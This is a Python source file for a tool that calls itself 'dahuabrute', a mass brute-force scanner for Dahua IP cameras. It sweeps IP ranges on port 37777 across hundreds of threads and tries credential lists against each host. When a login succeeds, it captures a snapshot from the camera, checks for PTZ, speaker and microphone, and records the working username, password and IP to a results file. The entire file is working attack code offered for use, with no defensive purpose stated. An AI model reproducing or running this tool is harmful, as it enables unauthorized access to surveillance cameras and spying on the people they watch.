import os
import sys
import argparse
import ipaddress
import time
import threading
import signal
import socket
import ctypes
import platform
import re
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED

COLORS = {
    "lightblue": "\033[94m",
    "lightgray": "\033[37m",
    "white": "\033[97m",
    "lightgreen": "\033[92m",
    "lightred": "\033[91m",
    "reset": "\033[0m"
}

def cprint(color_name, msg, end="\n"):
    color = COLORS.get(color_name, COLORS["reset"])
    sys.stdout.write(f"{color}{msg}{COLORS['reset']}{end}")
    sys.stdout.flush()

C_LLONG = ctypes.c_longlong
C_DWORD = ctypes.c_ulong
DH_DEV_SYS_ATTR = 0x0001
QUERY_PTZ_LOCATION = 0x0036

class DH_VERSION_INFO(ctypes.Structure):
    _fields_ = [
        ('dwSoftwareVersion', ctypes.c_uint32),
        ('szSoftwareBuildDate', ctypes.c_char * 20),
        ('hiSoftwareVersion', ctypes.c_uint32),
        ('dwReserved', ctypes.c_uint32 * 3)
    ]

class DH_DSP_ENCODECAP(ctypes.Structure):
    _fields_ = [
        ('dwVideoStandardMask', ctypes.c_uint32),
        ('dwImageSizeMask', ctypes.c_uint32),
        ('dwEncodeModeMask', ctypes.c_uint32),
        ('dwStreamCap', ctypes.c_uint32),
        ('dwImageSizeMask_Assi', ctypes.c_uint32 * 8),
        ('dwMaxEncodePower', ctypes.c_uint32),
        ('wMaxSupportChannel', ctypes.c_uint16),
        ('wChannelMaxSetSync', ctypes.c_uint16),
    ]

class DHDEV_SYSTEM_ATTR_CFG(ctypes.Structure):
    _fields_ = [
        ('dwSize', ctypes.c_uint32),
        ('stVersion', DH_VERSION_INFO),
        ('stDspEncodeCap', DH_DSP_ENCODECAP),
        ('szDevSerialNo', ctypes.c_byte * 48),
        ('byDevType', ctypes.c_byte),
        ('szDevType', ctypes.c_char * 32),
        ('byVideoCaptureNum', ctypes.c_byte),
        ('byAudioCaptureNum', ctypes.c_byte),
        ('byTalkInChanNum', ctypes.c_byte),
        ('byTalkOutChanNum', ctypes.c_byte),
        ('byDecodeChanNum', ctypes.c_byte),
        ('byAlarmInNum', ctypes.c_byte),
        ('byAlarmOutNum', ctypes.c_byte),
        ('byNetIONum', ctypes.c_byte),
        ('byUsbIONum', ctypes.c_byte),
        ('byIdeIONum', ctypes.c_byte),
        ('byComIONum', ctypes.c_byte),
        ('byLPTIONum', ctypes.c_byte),
        ('byVgaIONum', ctypes.c_byte),
        ('byIdeControlNum', ctypes.c_byte),
        ('byIdeControlType', ctypes.c_byte),
        ('byCapability', ctypes.c_byte),
        ('byMatrixOutNum', ctypes.c_byte),
        ('byOverWrite', ctypes.c_byte),
        ('byRecordLen', ctypes.c_byte),
        ('byDSTEnable', ctypes.c_byte),
        ('wDevNo', ctypes.c_uint16),
        ('byVideoStandard', ctypes.c_byte),
        ('byDateFormat', ctypes.c_byte),
        ('byDateSprtr', ctypes.c_byte),
        ('byTimeFmt', ctypes.c_byte),
        ('byLanguage', ctypes.c_byte),
    ]

class NET_IN_LOGIN_WITH_HIGHLEVEL_SECURITY(ctypes.Structure):
    _fields_ = [
        ('dwSize', ctypes.c_uint32), ('szIP', ctypes.c_char * 64),
        ('nPort', ctypes.c_int), ('szUserName', ctypes.c_char * 64),
        ('szPassword', ctypes.c_char * 64), ('emSpecCap', ctypes.c_int),
        ('byReserved', ctypes.c_ubyte * 4), ('pCapParam', ctypes.c_void_p),
        ('emTLSCap', ctypes.c_int), ('szLocalIP', ctypes.c_char * 64)
    ]

class NET_DEVICEINFO_Ex(ctypes.Structure):
    _fields_ = [
        ('sSerialNumber', ctypes.c_char * 48),
        ('nAlarmInPortNum', ctypes.c_int),
        ('nAlarmOutPortNum', ctypes.c_int),
        ('nDiskNum', ctypes.c_int),
        ('nDVRType', ctypes.c_int),
        ('nChanNum', ctypes.c_int),
        ('byLimitLoginTime', ctypes.c_char),
        ('byLeftLogTimes', ctypes.c_char),
        ('bReserved', ctypes.c_char * 2),
        ('nLockLeftTime', ctypes.c_int),
        ('Reserved', ctypes.c_char * 24),
    ]

class NET_OUT_LOGIN_WITH_HIGHLEVEL_SECURITY(ctypes.Structure):
    _fields_ = [
        ('dwSize', ctypes.c_uint32),
        ('stuDeviceInfo', NET_DEVICEINFO_Ex),
        ('nError', ctypes.c_int),
        ('byReserved', ctypes.c_ubyte * 132),
    ]

class SNAP_PARAMS(ctypes.Structure):
    _fields_ = [("Channel", ctypes.c_uint32), ("Quality", ctypes.c_uint32), ("ImageSize", ctypes.c_uint32), ("mode", ctypes.c_uint32), ("WaitTime", ctypes.c_uint32), ("Reserved", ctypes.c_uint32 * 2)]

sdk = None
debug_enabled = False
session_lock = threading.Lock()
session_files = {}
session_events = {}
stats = {"scanned": 0, "found": 0, "total": 0}
stats_lock = threading.Lock()
res_file_lock = threading.Lock()
progress_lock = threading.Lock()
stop_event = threading.Event()
interrupted_by_user = False
last_progress_time = 0.0

def debug_log(msg):
    if debug_enabled:
        with progress_lock:
            sys.stdout.write(f"\r{COLORS['lightgray']}[DEBUG] {msg}{COLORS['reset']}\n")
            sys.stdout.flush()

def sanitize_filename(name):
    return re.sub(r'[\\/*?:"<>|]', "_", name)

def snap_callback(lLoginID, pBuf, RevLen, EncodeType, CmdSerial, dwUser):
    if not pBuf or RevLen <= 0: return
    with session_lock:
        filename = session_files.get(lLoginID)
        event = session_events.get(lLoginID)
    debug_log(f"Callback for ID {lLoginID}: {RevLen} bytes received")
    if not filename: return
    try:
        data = ctypes.string_at(pBuf, RevLen)
        with open(filename, 'wb') as f:
            f.write(data)
        debug_log(f"Successfully written: {filename}")
    except Exception as e:
        debug_log(f"Failed to write snapshot: {e}")
    finally:
        if event: event.set()

fSnapRev = ctypes.CFUNCTYPE(None, C_LLONG, ctypes.POINTER(ctypes.c_ubyte), ctypes.c_uint, ctypes.c_uint, C_DWORD, C_LLONG)
c_snap_callback = fSnapRev(snap_callback)

def load_sdk():
    system = platform.system()
    curr_dir = os.path.dirname(os.path.abspath(__file__))
    lib_folder = os.path.join(curr_dir, "Libs", "win64" if system == "Windows" else "linux64")
    if system == "Windows":
        os.environ['PATH'] = lib_folder + os.pathsep + os.environ['PATH']
        p = os.path.join(lib_folder, "dhnetsdk.dll")
        _sdk = ctypes.WinDLL(p)
    else:
        os.environ["INFRA_LOG_LEVEL"] = "0"
        p = os.path.join(lib_folder, "libdhnetsdk.so")
        _sdk = ctypes.CDLL(p, mode=ctypes.RTLD_GLOBAL)
    return _sdk

def is_port_open(ip, port, timeout=2):
    try:
        debug_log(f"Checking {ip}:{port}...")
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(timeout)
        result = conn.connect_ex((ip, port))
        conn.close()
        return result == 0
    except: return False

def get_device_info(login_id):
    try:
        debug_log(f"Retrieving info for ID {login_id}...")
        cfg = DHDEV_SYSTEM_ATTR_CFG()
        cfg.dwSize = ctypes.sizeof(DHDEV_SYSTEM_ATTR_CFG)
        ret_len = ctypes.c_int(0)
        res = sdk.CLIENT_GetDevConfig(C_LLONG(login_id), DH_DEV_SYS_ATTR, -1, ctypes.byref(cfg), ctypes.sizeof(cfg), ctypes.byref(ret_len), 5000)
        model = "Unknown"
        speaker = False; mic = False
        if res:
            try: model = cfg.szDevType.decode('utf-8', errors='ignore').strip('\x00')
            except: model = "Unknown"
            if model == "": model = "Unknown"
            if cfg.byTalkOutChanNum > 0: speaker = True
            if cfg.byTalkInChanNum > 0 or cfg.byAudioCaptureNum > 0: mic = True
        
        ptz_buf = (ctypes.c_byte * 256)()
        ptz_ret = ctypes.c_int(0)
        ptz_res = sdk.CLIENT_QueryDevState(C_LLONG(login_id), QUERY_PTZ_LOCATION, ctypes.cast(ptz_buf, ctypes.c_char_p), 256, ctypes.byref(ptz_ret), 2000)
        
        DH_DEV_PTZ_CFG = 0x0040
        ptz_cfg_buf = (ctypes.c_byte * 4096)()
        ret_len = ctypes.c_int(0)
        ptz_cfg_res = sdk.CLIENT_GetDevConfig(C_LLONG(login_id), DH_DEV_PTZ_CFG, -1, ctypes.byref(ptz_cfg_buf), ctypes.sizeof(ptz_cfg_buf), ctypes.byref(ret_len), 3000)
        
        ptz_heuristic = False
        if model.upper().startswith("SD") or "PTZ" in model.upper() or "DOME" in model.upper():
            ptz_heuristic = True

        ptz = True if (ptz_res or ptz_cfg_res or ptz_heuristic) else False
        
        debug_log(f"ID {login_id} - Model: {model} | S:{speaker} M:{mic} P:{ptz} (L:{bool(ptz_res)} C:{bool(ptz_cfg_res)} H:{ptz_heuristic})")
        return model, speaker, mic, ptz
    except Exception as e:
        debug_log(f"Info retrieval failed for ID {login_id}: {e}")
        return "Unknown", False, False, False

def attempt_login(ip, port, user, password, output_dir):
    login_ok = False
    try:
        debug_log(f"Attempting login: {user}:{password}@{ip}:{port}")
        stuIn = NET_IN_LOGIN_WITH_HIGHLEVEL_SECURITY()
        stuIn.dwSize = ctypes.sizeof(NET_IN_LOGIN_WITH_HIGHLEVEL_SECURITY)
        stuIn.szIP = ip.encode(); stuIn.nPort = int(port)
        stuIn.szUserName = user.encode(); stuIn.szPassword = password.encode()
        stuOut = NET_OUT_LOGIN_WITH_HIGHLEVEL_SECURITY()
        stuOut.dwSize = ctypes.sizeof(NET_OUT_LOGIN_WITH_HIGHLEVEL_SECURITY)

        login_id = sdk.CLIENT_LoginWithHighLevelSecurity(ctypes.byref(stuIn), ctypes.byref(stuOut))
        if login_id <= 0:
            debug_log(f"High-level login failed for {ip}, trying legacy...")
            device_info = (ctypes.c_byte * 1024)()
            error_ptr = ctypes.pointer(ctypes.c_int(0))
            login_id = sdk.CLIENT_Login(ip.encode(), int(port), user.encode(), password.encode(), device_info, error_ptr)

        if login_id > 0:
            login_ok = True
            debug_log(f"Logged in: {ip}:{port} (ID: {login_id})")
            model, s, m, p = get_device_info(login_id)
            caps = []
            if p: caps.append("PTZ")
            if s: caps.append("speaker")
            if m: caps.append("mic")
            capabilities = ":".join(caps) if caps else "NONE"
            
            clean_model = sanitize_filename(model)
            cap_suffix = f"_{capabilities.replace(':', '_')}" if capabilities != "NONE" else ""
            filename = os.path.join(output_dir, f"{ip}_{port}_{user}_{password}_{clean_model}{cap_suffix}.jpg")
            
            snap_done = threading.Event()
            with session_lock:
                session_files[login_id] = filename
                session_events[login_id] = snap_done
            
            snap = SNAP_PARAMS()
            snap.Channel = 0; snap.Quality = 3; snap.mode = 0 
            
            debug_log(f"Requesting SnapPictureEx for {ip}...")
            sdk.CLIENT_SnapPictureEx(C_LLONG(login_id), ctypes.byref(snap), 0)
            snap_ok = snap_done.wait(timeout=5.0)
            if not snap_ok:
                debug_log(f"SnapPictureEx timeout for {ip}, trying SnapPicture...")
                sdk.CLIENT_SnapPicture(C_LLONG(login_id), ctypes.byref(snap))
                snap_ok = snap_done.wait(timeout=10.0)
            
            if snap_ok:
                debug_log(f"Snapshot saved for {ip}")
                with res_file_lock:
                    with open(os.path.join(output_dir, "results.txt"), "a") as rf:
                        rf.write(f"{user}:{password}@{ip}:{port} [{model}] [{capabilities.replace(':', '_')}]\n")
            else:
                debug_log(f"Snapshot failed for {ip} (all methods)")
            
            sdk.CLIENT_Logout(C_LLONG(login_id))
            with session_lock:
                if login_id in session_files: del session_files[login_id]
                if login_id in session_events: del session_events[login_id]
            return login_ok, snap_ok
        else:
            debug_log(f"Login failed for {ip}:{port} (User: {user})")
        return False, False
    except Exception as e:
        debug_log(f"Error during login attempt for {ip}: {e}")
        return login_ok, False

def process_target(ip, port, credentials, output_dir):
    if stop_event.is_set(): return False
    if not is_port_open(ip, port):
        with stats_lock: stats["scanned"] += 1
        return False
    debug_log(f"Port 37777 open on {ip}")
    success = False
    for cred in credentials:
        if stop_event.is_set(): break
        user, password = cred.split(':')
        login_ok, snap_ok = attempt_login(ip, port, user, password, output_dir)
        if login_ok:
            if snap_ok:
                success = True
                with stats_lock: stats["found"] += 1
            break
    with stats_lock: stats["scanned"] += 1
    return success

def format_progress(scanned, found, total, width=48):
    percent = int((scanned / total) * 100) if total else 0
    filled = int((scanned / total) * width) if total else 0
    bar = '█' * filled + '-' * (width - filled)
    return f"{COLORS['white']}[=] Scanned: {scanned} | Found: {found} [{bar}] {percent}%{COLORS['reset']}"

def print_progress_once():
    global last_progress_time
    with progress_lock:
        sys.stdout.write('\r' + format_progress(stats["scanned"], stats["found"], stats["total"]))
        sys.stdout.flush()
        last_progress_time = time.time()

def signal_handler(sig, frame):
    global interrupted_by_user
    if not interrupted_by_user:
        interrupted_by_user = True
        stop_event.set()
        sys.stdout.write('\n')
        cprint("lightgray", "[*] Interrupted by user! Stopping...")
        os._exit(1)

def parse_targets_generator(target_str):
    try:
        target_str = target_str.strip()
        if not target_str: return
        if '-' in target_str:
            parts = target_str.split('-')
            start_ip = parts[0].strip()
            end_ip = parts[1].strip()
            start_int = int(ipaddress.IPv4Address(start_ip))
            end_int = int(ipaddress.IPv4Address(end_ip))
            for ip_int in range(start_int, end_int + 1):
                yield str(ipaddress.IPv4Address(ip_int)), 37777
        elif '/' in target_str:
            net = ipaddress.IPv4Network(target_str, strict=False)
            for ip in net.hosts():
                yield str(ip), 37777
        elif ':' in target_str:
            ip, port = target_str.split(':')
            ipaddress.IPv4Address(ip)
            yield ip, int(port)
        else:
            ipaddress.IPv4Address(target_str)
            yield target_str, 37777
    except: pass

def count_targets(filename):
    total = 0
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if not line: continue
                try:
                    target_str = line
                    if '-' in target_str:
                        parts = target_str.split('-')
                        start = int(ipaddress.IPv4Address(parts[0].strip()))
                        end = int(ipaddress.IPv4Address(parts[1].strip()))
                        total += (end - start + 1)
                    elif '/' in target_str:
                        net = ipaddress.IPv4Network(target_str, strict=False)
                        if net.prefixlen == 32: total += 1
                        elif net.prefixlen == 31: total += 2
                        else: total += (net.num_addresses - 2)
                    else:
                        total += 1
                except: pass
    except: pass
    return total

def file_target_generator(filename):
    with open(filename, 'r') as f:
        for line in f:
            line = line.strip()
            if not line: continue
            yield from parse_targets_generator(line)

def validate_files_fast(args):
    if not os.path.exists(args.input):
        cprint("lightred", f"[!] {args.input} not found!"); return False
    
    cprint("lightgray", "[*] Counting targets...")
    total = count_targets(args.input)
    if total == 0: cprint("lightred", f"[!] {args.input} has no valid targets!"); return False
    stats["total"] = total
    
    if not os.path.exists(args.creds): cprint("lightred", f"[!] creds.cfg not found!"); return False
    with open(args.creds, 'r') as f:
        lines = f.readlines()
        if not lines: cprint("lightred", f"[!] creds.cfg is empty!"); return False
        for i, line in enumerate(lines):
            line = line.strip()
            if not line: continue
            if ":" not in line: cprint("lightred", f"[!] creds.cfg invalid format - line: {i+1}!"); return False
    
    if os.path.exists(args.output):
        if not os.access(args.output, os.W_OK): cprint("lightred", f"[!] {args.output} Already exists and read-only!"); return False
    else:
        try: os.makedirs(args.output)
        except: cprint("lightred", f"[!] {args.output} Cannot be created!"); return False
    return True

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-i", "--input"); parser.add_argument("-o", "--output")
    parser.add_argument("-c", "--creds", default="creds.cfg")
    parser.add_argument("-t", "--threads", type=int, default=512)
    parser.add_argument("-d", "--debug", action="store_true")
    parser.add_argument("-?", "--help", action="store_true")
    args, _ = parser.parse_known_args()
    global debug_enabled
    debug_enabled = args.debug

    if "-?" in sys.argv or args.help or not args.input:
        cprint("lightblue", "[?] dahuabrute - Dahua IP cameras bruteforce tool")
        cprint("lightgray", "-i [Path to the input file (Supports IP/IP:Port/Ranges/CIDR)]")
        cprint("lightgray", "-o [Path to the output folder]")
        cprint("lightgray", "-t [Threads number (Default=512)]")
        cprint("lightgray", "-d [Show Debug Information]")
        cprint("lightgray", "-? [Help]")
        return
    cprint("lightblue", "[~] dahuabrute")
    
    if not validate_files_fast(args): return
    
    global sdk
    try:
        sdk = load_sdk()
        sdk.CLIENT_LoginWithHighLevelSecurity.restype = C_LLONG
        sdk.CLIENT_Login.restype = C_LLONG
        sdk.CLIENT_Init(None, None); sdk.CLIENT_SetSnapRevCallBack(c_snap_callback, 0)
    except Exception as e: cprint("lightred", f"[!] SDK Initialization failed: {e}"); return
    
    cprint("lightgray", f"[+] Input: {args.input}")
    cprint("lightgray", f"[+] Output: {args.output}")
    cprint("lightgray", f"[+] Threads: {args.threads}")
    cprint("lightgray", f"[+] Hosts: {stats['total']}")
    sys.stdout.write('\n')
    
    signal.signal(signal.SIGINT, signal_handler)
    with open(args.creds, "r") as f:
        credentials = [l.strip() for l in f if ":" in l]
    
    running = set(); last_update = 0.0
    target_gen = file_target_generator(args.input)
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        def submit_next():
            try:
                result = next(target_gen)
                if not result: return False
                ip, port = result
                fut = executor.submit(process_target, ip, port, credentials, args.output)
                running.add(fut); return True
            except StopIteration: return False
            except Exception: return True
        
        for _ in range(args.threads * 2):
            if not submit_next(): break
            
        while running and not stop_event.is_set():
            done, _ = wait(running, timeout=0.05, return_when=FIRST_COMPLETED)
            for fut in done:
                running.discard(fut)
                submit_next()
            now = time.time()
            if now - last_update >= 0.1 and not interrupted_by_user:
                print_progress_once(); last_update = now
                
    if not interrupted_by_user:
        print_progress_once(); sys.stdout.write('\n')
        cprint("lightgreen", "[+] Scan complete! Stopping...")
    sdk.CLIENT_Cleanup()
if __name__ == "__main__":
    main()
